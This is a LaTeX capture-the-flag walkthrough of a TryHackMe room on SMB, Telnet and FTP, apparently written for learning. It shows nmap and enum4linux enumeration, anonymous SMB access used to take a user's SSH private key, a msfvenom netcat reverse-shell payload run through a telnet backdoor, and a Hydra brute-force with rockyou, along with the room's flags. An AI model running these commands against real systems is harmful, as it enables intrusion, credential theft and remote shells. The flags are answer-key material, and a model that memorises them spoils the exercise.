\addcontentsline{toc}{subsubsection}{Network Services}
\subsubsection*{Network Services}
\label{Network_Services}
After a first task consisting of a friendly welcoming, we check its box and move on to the second task.
\T{Understanding SMB}{
SMB stands for Server Message Block Protocol, a client-server comunication protocol which enables the sharing of the resources on a network, such as files, printers or serial ports.\\
Servers make file systems and other resources available to clients on the network, providing shared file systems and other hardware resources in addition to the ones the clients already have.\\
As a response-request protocol, SMB transmits multiple messages between client and server to establish a connection, which takes place via NetBIOS over TCP/IP, NetBEUI or IPX/SPX.\\
Within an established connection, the clients send commands (SMBs)to the server and act equally as with a local file system, but over the network.\\
All WindowsOS newer than Win95 have an included client-server SMB protocol support, and Unix uses Samba, an open source server.\\
The questions are a reading comprehension:
\QA{
What does SMB stand for?
}{
Server Message Block
}

\QA{
What type of protocol is SMB?
}{
response-request
}

\QA{
What do clients connect to servers using?
}{
TCP/IP
}

\QA{
What systems does Samba run on?
}{
Unix
}
}

\T{Enumerating SMB}{
First, we deploy the machine attached to this task.\\
Enumeration is the process of gathering information to find potential attack vectors, and is essential to optimize efforts in an attack environment.\\
Examples of pieces of information to be gained through enumeration are credentials, network information, hostnames, application data and services among others.\\

Usually there are SMB share drives on a server, and these serve as a good starting point for attacks, as they may contain important information.\\

The first step of a nameworthy enumeration is a port scan which can provide us with useful information, such as services and applications running on the target, as well as its structure and OS.\\

Another useful tool for enumeration is Enum4Linux, which despite its name works both on Windows and Linux systems.\\
It is used to enumerate SMB shares and serves as a wrapper sround tools in the Samba package to extract the desired information.\\
It is installed per default on Parrot and Kali, else one can download it from \href{https://github.com/CiscoCXSecurity/enum4linux}{their official github repo}.\\
The syntax for Enum4Linux is\\
\cd{enum4linux [options] <target IP>}
with useful switches:\\

\begin{tabular}{r|l}
\textbf{TAG}& \textbf{FUNCTION}\\
-U & get userlist\\
-M & get machine list\\
-N & get namelist dump (different from -U and -M)\\
-S & get sharelist\\
-P & get password policy information\\
-G & get group and member list\\
-a & all of the above, full basic enumeration
\end{tabular}

The questions of this task rely on the enumeration tasks on the target machine:\\
\QA{
Conduct an nmap scan of your choosing, How many ports are open?
}{
We see \textbf{3} open ports with a SYN scan \cd{sudo nmap -vv -sS -Pn 10.10.64.123}, namely ssh running on port 22, netbios-ssn running on port 139 and microsoft-ds running on port 445.
}
\QA{
What port is SMB running on?
}{
Since SMB runs on NetBIOS as explained before, we deduce that it must be port 139. The standard port of SMB is also 445, as a quick search gives us, so the answer must be \textbf{139/445}
}
\QA{
Let's get started with Enum4Linux, conduct a full basic enumeration. For starters, what is the workgroup name?    
}{
Running \cd{enum4linux -a 10.10.64.123} we see in multiple steps (e.g Enumeration, Getting domain SID, Share enumeration, etc) that the workgroup name is WORKGROUP
}
\QA{
What comes up as the name of the machine?
}{
We further see, e.g in Nbtstat Info, that the name is POLOSMB
}
\QA{
What operating system version is running?
}{
Under OS Information we find 6.1 as the \cd{os version}
}

\QA{
What share sticks out as something we might want to investigate?
}{
In the share enumeration we see \cd{profiles}, containing credential informations, and is as such our target.
}
}

\T{Exploiting SMB}{
Vulnerabilities such as \href{https://www.cvedetails.com/cve/CVE-2017-7494/}{CVE-2017-7494} allow remote code execution exploiting SMB, but misconfigurations in an honest system are more likely to be found. In this case we'll use anonymous SMB share access.\\

From the previous stage we know the SMB share location and the name of the SMB share we are interested in. Using SMBClient, a client to access resources on servers, part of the default Samba suite, we'll access the SMB share using 
\codenl{smbclient //[IP]/[SHARE] -U [username] -p [port]}

\QA{
What would be the correct syntax to access an SMB share called "secret" as user "suit" on a machine with the IP 10.10.10.2 on the default port?
}{
Applying the above syntax we know:\\
\codenl{smbclient //10.10.10.2/secret -U suit -p 139}
}
Great! Now you've got a hang of the syntax, let's have a go at trying to exploit this vulnerability. You have a list of users, the name of the share (smb) and a suspected vulnerability. \\
Lets see if our interesting share has been configured to allow anonymous access, I.E it doesn't require authentication to view the files. We can do this easily by:
\begin{itemize}
\item using the username "Anonymous"
\item connecting to the share we found during the enumeration stage
\item and not supplying a password. 
\end{itemize}
\QA{
Does the share allow anonymous access? Y/N?
}{
Providing in the same syntax the command 
\codenl{smbclient //10.10.64.123/profiles -U Anonymous}
and just typing Intro when as password requirement prompts, we have access to the SMB share, hance the answer is Y
}
\QA{
Great! Have a look around for any interesting documents that could contain valuable information. Who can we assume this profile folder belongs to?
}{
Opening the only text file we find in the share, "Working From Home Information.txt" via \cd{more "Working From Home Information.txt"} (Important to use the introduction marks ", as the file has spaces in its name!) we read:\\
"John Cactus,\\
As you're well aware, due to the current pandemic most of POLO inc. has insisted that, wherever 
possible, employees should work from home. As such- your account has now been enabled with ssh
access to the main server.\\
If there are any problems, please contact the IT department at it\@ polointernalcoms.uk\\
Regards,\\
James\\
Department Manager "\\
And can hence deduce this machine belongs to John Cactus
}
\QA{
What service has been configured to allow him to work from home?
}{
SSH
}
\QA{
Okay! Now we know this, what directory on the share should we look in?
}{
.ssh
}
\QA{
This directory contains authentication keys that allow a user to authenticate themselves on, and then access, a server. Which of these keys is most useful to us?
}{
In the .ssh directory we see id\_rsa, id\_rsa.pub and authorized\_keys, but we are most interested in id\_rsa, as this is the default name of any SSH indentity file.
}
Download this file to your local machine, and change the permissions to "600" using "chmod 600 [file]".\\
Now, use the information you have already gathered to work out the username of the account. Then, use the service and key to log-in to the server.
\QA{
What is the smb.txt flag?
}{
After doing as instructed, we connect to 
\codenl{ssh 10.10.64.123 -l cactus -i id\_rsa}
after some failed attempts to connecting as JohnCactus and johncactus.\\
Once remotely connected, we print the contents of the only file smb.txt and read the flag
\F{THM \{smb\_is\_fun\_eh?\}}
}
}

\T{Understanding Telnet}{
Telnet is an application protocol used to connect to and execute commands on a remote machine hosting a Telnet server by means of a Telnet client.\\
Said client establishes as client-server connection, such that the client becomes a virtual terminal for the remote host.\\
Since Telnet sends all messages in clear text and has no specific security mechanisms, it has been replaced by SSH.\\
The syntax to use telnet is as follows: \cd{telnet [IP] [port]}.\\
The questions are a reading comprehension of the above text:
\QA{
What is Telnet?
}{
Application Protocol
}
\QA{
What has slowly replaced Telnet?
}{
SSH
}
\QA{
How would you connect to a Telnet server with the IP 10.10.10.3 on port 23?
}{
\cd{telnet 10.10.10.3 23}
}
\QA{
The lack of what, means that all Telnet communication is in plaintext?
}{
Encryption
}
}

\T{Enumerating Telnet}{
Our goal is to enumerate to find a possible misconfiguration, starting with a port scan:\\
We first start the machine and enumerate it with a "normal" nmap scan \cd{sudo nmap -vv -Pn -sS 10.10.28.54}.\\
Doing this scan on the 1000 most common ports we find nothing (\cd{All 1000 scanned ports are closed because of 1000 resets}).\\
Hence, we must conduct a more thorough examination to scan all ports:\\
\cd{sudo nmap -vv -Pn -sS -p- 10.10.28.54}\\
We then see an open port at 8012 (8012/tcp) with unknown service.\\
If we run instead \cd{sudo nmap -vv -Pn -sC -sV -p- 10.10.28.54} we see \cd{SKIDY'S BACKDOOR} below the open port.\\
This finishes the enumeration step, which we sum up in the questions below:\\
\QA{
How many ports are open on the target machine?
}{
After all scans, we see there is actually one open port, hence the answer is 1.
}
\QA{
What port is this?
}{
We saw the open port is 8012.
}
\QA{
Thi port is unassigned, but still lists the protocol it's using, what protocol is this?
}{
As stated in the port description, it uses tcp.
}
\QA{
Now re-run the nmap scan, without the -p- tag, how many ports show up as open?
}{
When scanning only the 1000 most likely ports, we see no open ports, hence 0.
}

Here, we see that by assigning telnet to a non-standard port, it is not part of the common ports list, or top 1000 ports, that nmap scans. It's important to try every angle when enumerating, as the information you gather here will inform your exploitation stage. 


\QA{
Based on the title returned to us, what do we think this port could be used for?
}{
A backdoor, as the name "skidy's backdoor" suggests
}
\QA{
Who could it belong to? Gathering possible usernames is an important step in enumeration.
}{
Skidy
}

As a helpful note:\\

Always keep a note of information you find during your enumeration stage, so you can refer back to it when you move on to try exploits.
}

\T{Exploiting Telnet}{
Telnet is per se dangerous as it lacks encryption, but exploiting a misconfiguration usually yields better results.\\
From the enumeration we know: 
\begin{itemize}
\item There is a poorly hidden telnet service running on this machine
\item The service itself is marked "backdoor"
\item We have possible username of "Skidy" implicated
\end{itemize}
Now we'll try to access the telnet port and get a reverse shell on the machine.\\
Note: a shell is a piece of coe or program that can be used to gain code or command execution on a device.\\
A reverse shell is a shell from the target machine to the attacker, which has a listening port receiving the connection.\\
We do this by connecting from our terminal via \cd{telnet 10.10.255.52 8012}. Note that the IP is not the same, I had to reset the machine.\\
Once connected, we can start solving the questions:
\QA{
Great! It's an open telnet connection! What welcome message do we receive? 
}{
SKIDY's BACKDOOR
}
We try to execute some commands, e.g \cd{.RUN ls}, but it's of no use. 
\QA{
Let's try executing some commands, do we get a return on any input we enter into the telnet session? (Y/N)
}{
N
}
Hmm... that's strange. Let's check to see if what we're typing is being executed as a system command. \\
Start a tcpdump listener on your local machine.\\
Since I am using my own machine via OpenVPN, typing
\codenl{sudo tcpdump ip proto $\setminus \setminus$ icmp -i tun0} starts a tcpdump listener, specifically listening for ICMP traffic pings operate on.\\
Now, on the target machine, we run \cd{.RUN ping [local THM ip] -c 1}, i.e in my case \cd{.RUN ping 10.11.58.131 -c 1}.\\
We then see two lines erupt in the listening terminal window, meaning we were able to execute commands and reach our local machine. We will use this to  generate a reverse shell payload  using msfvenom, which generates and encodes a netcat reverse shell with the syntax:
\codenl{msfvenom -p cmd/unix/reverse\_netcat lhost=[local tun0 ip] lport=4444 R}
where \cd{-p} is the switch for the payload, \cd{lhost} is our local host IP address, i.e our machine's IP address, \cd{lport} is the port to listen on, i.e the port on our machine, and \cd{R} means to export the payload in raw format.\\
Running this command on our machine as 
\codenl{msfvenom -p cmd/unix/reverse\_netcat lhost=10.11.58.131 lport=4444 R} we get the payload 
\codenl{mkfifo /tmp/owrnqs; nc 10.11.58.131 4444 0</tmp/owrnqs | /bin/sh >/tmp/owrnqs 2>\&1; rm /tmp/owrnqs}
\QA{
What word does the generated payload start with?
}{
mkfifo
}
Now we start a netcat listener on our machine using:
\codenl{nc -lvp [listening port]}
\QA{
What would the command look like for the listening port we selected in our payload?
}{
nc -lvp 4444
}
After pasting the payload we generated previously in the target machine and executing the command \cd{.RUN [payload]} we see in our listening port the message \cd{Connection received on [target]} and can from there on execute commands on the target machine.\\
We discover a flag.txt file with the desired flag as content:
\QA{
What is the content of flag.txt?
}{
\F{
THM\{y0u\_g0t\_th3\_t3ln3t\_fl4g\}}
}
}

\T{Understanding FTP}{
FTP (File Transfer Protocol) is a protocol which, using a client-server model, allows remote transfer of files over a network.\\
It is an efficient way of transmitting commands as well as data using 2 channels: a command channel and a data channel.\\
Being a client-server protocol, it works in the following way: 
\begin{enumerate}
\item The client initiates the connection.
\item The server validates the login credentials.
\item The server opens a session.
\end{enumerate}
From within an open session the client can execute FTP commands on the server.\\
There are two kinds of connection: Active and Passive, and FTP supports both of them at the same time and individually.\\
An active connection means that the client opens a port and starts listening, and the server is required to actively connect to it.\\
On the other side, a passive connection is a connection where the server opens a port and the client connects to it.\\

The separation of commands and data in different channels allows for commands to be sent without waiting for the end of an eventual data transfer.\\
For further reading on this, see \href{https://www.ietf.org/rfc/rfc959.txt}{this page} of the Internet Engineering Task Force.\\
The questions on this task are almost completely a reading comprehension:
\QA{
What communications model foes FTP use?
}{
Client-Server
}
\QA{
What's the standard FTP port?
}{
Reading the manual on the IEFT we see multiple references to the standard L port, which is defined at the end as port \textbf{21}
}
\QA{
How many modes of FTP connection are there? 
}{
\textbf{2}: Active and Passive.
}
}

\T{Enumerating FTP}{
We enumerate the FTP server we are going to deploy in order to know how to exploit an anonymous FTP login.\\
We are going to try and see if through this anonymous login we can pop a shell on the targeet system, a common pathway in CTF challenges and similar to real-life careless implementation of FTP servers.\\
In order to do so, we need to make sure an FTP client is installed (which should be the case in most Linux OS).\\
Some vulnerable versions of in.ftpd and other FTP server variants return different responses to the \cd{cwd} command for existing and non-existing home directories.\\
Since we can issue \cd{cwd} commands before authentication we can check for the likely existing user account corresponding with the found directory.\\
This is found mainly within legacy system, but still nice to know. \\

In order to answer the questions, we run an nmap port scan, which gives us 2 open ports, an ftp in port 21 and http in port 80.\\
This way we can already answer the first two questions:
\QA{
How many ports are open on the target machine?
}{
2
}
\QA{
What port is ftp running on?
}{
21
}
\QA{
What variant of FTP is running on it?
}{
In order to be able to answer this, we need to scan the given IP address again, this time with the version scan (\cd{-sV}) enabled, resulting in the command
\codenl{sudo nmap -vv -sV 10.10.47.165}
This way we see under \cd{VERSION} the entry \cd{vsftpd 2.0.8 or later}, which gives us \textbf{vsftpd} as answer
}
Great, now we know what type of FTP server we're dealing with we can check to see if we are able to login anonymously to the FTP server. We can do this using by typing "ftp [IP]" into the console, and entering "anonymous", and no password when prompted.
\QA{
What is the name of the file in the anonymous FTP directory?
}{
After doing as instructed we finding the file \cd{PUBLIC\_NOTICE.txt}.
}
We see its contents via \cd{less PUBLIC\_NOTICE.txt}: it is a message from Mike to everyone else.\\
This way we can also answer the next question:
\QA{
What do we think a possible username
could be?
}{
Mike (as they are the sender of the message)
}
}
\T{Exploiting FTP}{
FTP channels, as well as Telnet, are unencrypted.\\
Hence, a man-in-the-middle attack can be very successful (see \href{https://www.jscape.com/blog/countering-packet-sniffers-using-encrypted-ftp}{this article}.\\
For this machine we can rather exploit weak or default password configurations.\\
\textbf{Recapitulation:} We know
\begin{itemize}
\item There is an FTP server on this machine
\item We know there is a possible username related to the name ``Mike''
\end{itemize}
We'll then try to bruteforce the password of the FTP server using Hydra.\\

Hydra is a very fast online password cracking tool, able to deliver dictionary attacks against Telnet, RDP, SSH, FTP, HTTP, HTTPS, SMB, databases and many more. It comes by default on Parrot and Kali, else we can install it via \cd{sudo apt install hydra}\\
We'll use the following syntax:
\codenl{hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp}
consisting of:


\begin{tabular}{c|l}
Section & Function\\
\hline
\cd{-t 4} & runs 4 parallel connections per target\\
\cd{-l [user]} & Points to the user whose account we try to compromise\\
\cd{-P [path to dictionary]} & Points to the file containing the possible passwords to be tried\\
\cd{-vV} & Very verbose mode, showing login + password for each attempt\\
\cd{[machine IP]} & Target IP address\\
\cd{ftp} & Protocol to crack against
\end{tabular}

Our final syntax ends up being
\codenl{hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV 10.10.47.165}
Right at the 4th password attempt we find the password:
\QA{
What is the password for the user "mike"?
}{
password
}
We connect to the ftp server under \cd{ftp [IP]} and read ftp.txt:
\QA{
What is ftp.txt?
}{
\F{THM\{y0u\_g0t\_th3\_ftp\_fl4g\}}
}
We terminate the room and move on to the next room: Network Services 2
}
